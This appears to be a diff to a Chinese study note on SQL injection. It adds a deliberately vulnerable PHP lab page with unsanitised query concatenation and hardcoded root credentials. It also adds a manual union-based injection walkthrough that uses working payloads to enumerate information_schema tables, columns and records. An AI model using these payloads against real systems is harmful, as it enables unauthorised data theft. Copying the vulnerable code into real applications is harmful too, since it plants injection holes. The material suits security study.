@@ -39,7 +39,7 @@ SQL注入:(默认有漏洞)
 			 		--users				获取所用用户
 		A3.简单测试 test.php 内容如下:
 					<?php
-						$dbh = new PDO('mysql:host=localhost;dbname=sokmin', 'root','123456ss');    
+						$dbh = new PDO('mysql:host=localhost;dbname=sokmin', 'root','123456');    
 						$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);    
 						$dbh->exec('set names utf8');   
 
@@ -67,4 +67,96 @@ SQL注入:(默认有漏洞)
 			http://www.cnblogs.com/hongfei/p/3872156.html    SqlMap详细使用讲解
 
 
-	B.Sql语法注入			 		
+	B.Sql语法注入	
+		B1.漏洞搭建
+				<form method="GET" action="">
+				    ID：
+				    <input type="text" name="id" />
+				    <input type="submit" value="查询" />
+				</form>
+			<?php
+
+				$host = '127.0.0.1';
+				$port = 3306;
+				$un = 'root';
+				$pw = '123456ss';
+				$db = 'sokmin';
+
+				$id = @$_GET['id'];
+				if($id == '')
+				    return;
+				$conn = @mysql_connect($host . ':' . $port, $un, $pw);
+				if(!$conn)
+				    die('数据库连接错误：' . mysql_error());
+				mysql_select_db($db, $conn);
+				$sql = "select id, name from abc where id=$id";
+				// echo $sql;exit();
+				$res = mysql_query($sql, $conn);
+				if(!$res)
+				    die('数据库错误：'. mysql_error());
+				$num = mysql_num_rows($res);
+				if($num == 0)
+				{ 
+				    echo "<p>ID：$id</p>";
+				    echo "<p>无此记录</p>";
+				}
+				else
+				{
+				    $row = mysql_fetch_row($res);
+				    echo "<p>ID：$id</p>";
+				    echo "<p>Info：${row[1]}</p>";
+				}
+				mysql_close($conn);
+		B2.步骤
+			step1:通过字符拼接形成恒成立条件
+				eg:	
+					1 or 2=2
+			step2:基于回显
+				基于回显的意思就是页面中存在显示数据库中信息的地方,通过注入我们就能把我们要查询的东西显示在页面上。
+				一般页面中显示相关信息（比如帖子标题、内容）就能认为是基于回显的。
+
+				a.判断注入点:
+					我们将id设为1 and 1=1，发现正常显示。	
+					/sql.php?id=1%20and%201=1 	
+
+					将id设为1 and 1=2，显示无此记录。
+					那么这里就很可能出现注入点。
+				b.判断列数量
+					主要用于union语句的构建,构造如下
+						1 order by ?
+						? 从1开始++,知道报错,获得字段列数为 报错数字-1	(这里只是查询的字段,不一定是数据库所有的字段)
+					构建列:	
+						1 and 1=2 union select 1,2
+					结果如下:
+						ID：1 and 1=2 union select 1,2
+						Info：2
+				c.查询用户及数据库名称
+					在 MySQL 中，current_user函数显示用户名称，database函数显示当前数据库名称。
+					这里只有一个显示位置，为了方便起见，我们可以使用concat函数一次性显示出来。	
+
+					1 and 1=2 union select 1,concat(current_user(),' ',database()) 
+				d.查询表数量		
+					MySQL 中有一个数据库叫做information_schema,储存数据库和表的元信息
+					information_schema中有两个重要的表，一个叫tables，储存表的元信息
+					有两列特别重要 table_schema是所属数据库，table_name是表名称。
+					另一个表示columns，储存列的源信息，table_name列是所属表名称，column_name列是列名称。
+
+					1 and 1=2 union select 1,count(table_name) from information_schema.tables where table_schema=database() 
+
+					这里使用count查询出表的数量
+
+					1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit ?,1 通过改变?号的值可以获取所有的表名
+
+					可以将上面的count换成group_concat获取所有表名连接的字符串
+				e.查询列数量	
+					1 and 1=2 union select 1,count(column_name) from information_schema.columns where table_name='abc'
+					这里同上可以换成group_concat    这里是通过表名来查询的
+				f.查询行数量
+
+
+					1 and 1=2 union select 1, count(*) from abc	
+				g.查询记录
+					1 and 1=2 union select 1,concat(id,' ',name) from abc limit ?,1	
+
+			step3:手工注入(基于布尔值)		
+		 		
